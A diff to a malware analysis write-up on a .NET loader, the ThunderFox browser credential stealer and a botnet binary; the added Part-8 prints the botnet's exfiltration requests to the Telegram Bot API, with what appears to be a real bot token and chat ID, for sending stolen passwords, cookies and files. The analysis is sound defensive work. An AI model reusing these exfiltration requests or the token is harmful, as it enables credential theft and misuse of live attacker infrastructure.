@@ -186,14 +186,14 @@ The function names are obfuscated and hard to analyse statically.
 ## Dynamic Analysis
 
 Preliminaries to debug the Discompard.dll:
-- Load the original malware into dnspy
+- Load the original malware into dnSpy
 - Set a breakpoint in `System.Reflection.MethodBase.Invoke()` in mscorlib.dll
 ![](https://i.imgur.com/lXpJPiy.png)
 
 - Now, keep hitting the breakpoint and stepping out until you see that you have reached the method `TOfEQkKANJxMeS2a9c.l9KiV7K6JPwQWv7jdq0.bMBAzEBKcC()`.
 ![](https://i.imgur.com/2Nwq0qM.png)
 
-- The above method makes the dnspy to load the Discompard.dll, which you can access using Assembly explorer on the left.
+- The above method makes the dnSpy to load the Discompard.dll, which you can access using Assembly explorer on the left.
 - Now set a breakpoint at `TOfEQkKANJxMeS2a9c.kHaSXGF4djgFPmfQAx.nqk5uYnWxJ()` and remove the breakpoint from System.Reflection.MethodBase.Invoke().
 ![](https://i.imgur.com/FQUXA0K.png)
 
@@ -348,7 +348,7 @@ In `sub_46869E`:
 *(0x0A20648+index) = (*(0x0A20648+index) + *(0x0A20648+index-1) + *(0x0A21150+index))%256
 ```
 
-- The third loop uses this modified array and performs the XOR operation and generate the string "WScript.Shell" and the function `sub_468D3a` returns this string.
+- The third loop uses this modified array and performs the XOR operation and generate the string "WScript.shell" and the function `sub_468D3a` returns this string.
 ![](https://i.imgur.com/rPyC4sL.png)
 
 - The returned string is passed to the CreateObject, which creates a WScript Object that provides access to root object for the Windows Script Host object model (**wshom**).
@@ -427,7 +427,7 @@ The PEstudio reveals that the retrieved binary is the ThunderFox malware and tha
 
 MD5: d2ec533f8b40a8224d79c87c2291f943
 
-On decompilation using dnspy, we see that there are multiple suspicious namespaces defined:
+On decompilation using dnSpy, we see that there are multiple suspicious namespaces defined:
 ![](https://i.imgur.com/4NVzJZ2.png)
 
 The main function is defined in Class33 of an unnamed namespace ({}-). The main function uses try and catch, which helps the malware in case any exception occurs. It executes an empty block of code, thus doing nothing, not even exiting the program.
@@ -488,14 +488,53 @@ Main function:
     - It calls the `Class30.smethod_0`, which performs the same set of operations as above to get the DES CBC key.
     - The hostname, encrypted username, and encrypted password are retrieved from `signons.sqlite` using sqliteHandler.
     - For each row, it decrypts the username and password and then stores the hostname, username, password, along with the application name, in `Class33.string_0`.
-- The `Class33.string_0` is saved into the "C:\Users\IEUser\Templates\credentials.txt" file.
+- The `Class33.string_0` is saved into the "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\credentials.txt" file.
 ![](https://i.imgur.com/u2WkAzI.png)
 - The function then saves the Cookies from all browsers into "C:\Users\IEUser\Templates\Cookies{browser_name}.txt" :
   - For firefox-related browsers the cookies are stored in a sqlite db named `cookies.sqlite` for each profile inside `Browser path + "\Profiles"`.
   - For other browsers the cookies are stored in `Browser User Data path + "\Cookies"`, which is also a sqlite db.
   - The difference is that in other browsers, the raw data is encrypted, and the Chromium master key is used to decrypt it. In contrast, in Firefox-related browsers, the data is stored in plaintext.
-- The function then saves the Contacts from all firefox-related browsers into "C:\Users\IEUser\Templates\Contacts{browser_name}.txt" :
+- The function then saves the Contacts from all firefox-related browsers into "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\Contacts{browser_name}.txt" :
 ![](https://i.imgur.com/Bl89Ua7.png)
-  - In the same function, it saves all the MailMaster data and contacts in "C:\Users\IEUser\Templates\ContactsMailMaster.txt"
-- The function then saves the messages from all the firefox-related browsers into "C:\Users\IEUser\Templates\Messages{browser_name}.txt" :
+  - In the same function, it saves all the MailMaster data and contacts in "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\ContactsMailMaster.txt"
+- The function then saves the messages from all the firefox-related browsers into "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\Messages{browser_name}.txt" :
 ![](https://i.imgur.com/6JpFf9v.png)
+
+# Part-8: Back to DL_NATIVE_BOTNET1209
+
+After executing ThunderFox in `sub_4640c4`, the botnet binary loops the `sub_4661f1` 0x1f4 times. After that, it generates and modifies a few strings. If you go further into the program, in the function `sub_46464c`, it takes '79A4261B3FC61BA985DE6FE5C1C0B925' and passes it as an argument to `sub_46853c`, which returns BSTR('79A4261B3FC61BA985DE6FE5C1C0B925'). The returned value and 'ZiZRcjBKvueDrxRVSwAlfpuyMusWECie' are then passed as arguments to `sub_468D3a`, which returns '\credentials.txt'. This string is added to the end of "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates", and we get the path ("C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\credentials.txt") to the file generated in ThunderFox. The functions `sub_46853c` and `sub_468D3a` are used to extract the current date and time, username, computer name, and Windows version.
+
+![](https://i.imgur.com/1kQJsIf.png)
+
+This generates the bot ID that sends the message.
+
+![](https://i.imgur.com/IYo5eL7.png)
+
+This generates the chat ID.
+
+![](https://i.imgur.com/ELXCECp.png)
+
+The saved data from `credential.txt` is concatenated after 'Passwords', but as we don't have any credentials stored in Chrome or any other browser, it shows as 'Passwords:::MSEDGEWIN10\IEUser'.
+
+![](https://i.imgur.com/eXp4vQm.png)
+
+It uses the following request:
+
+```
+POST
+https://api.telegram.org/bot5797428905:AAGaRRXGZN1d9GGFd3sE5x4uSpCGF0PU4m4/sendMessage?text=Passwords:::MSEDGEWIN10\IEUser
+Date: 06/19/2023 10:50:45 AM
+Username: IEUser
+CompName: MSEDGEWIN10
+Windows Version: Windows 8/10 - 64-bit
+&chat_id=1251788325
+```
+
+The same steps are used to send documents like Cookies{browsername}.txt, Messages{browsername}.txt, and Contacts{browser.txt}.
+
+The request:
+
+```
+POST
+https://api.telegram.org/bot5797428905:AAGaRRXGZN1d9GGFd3sE5x4uSpCGF0PU4m4/sendDocument?chat_id=1251788325&caption=$caption&document=$PATH
+```
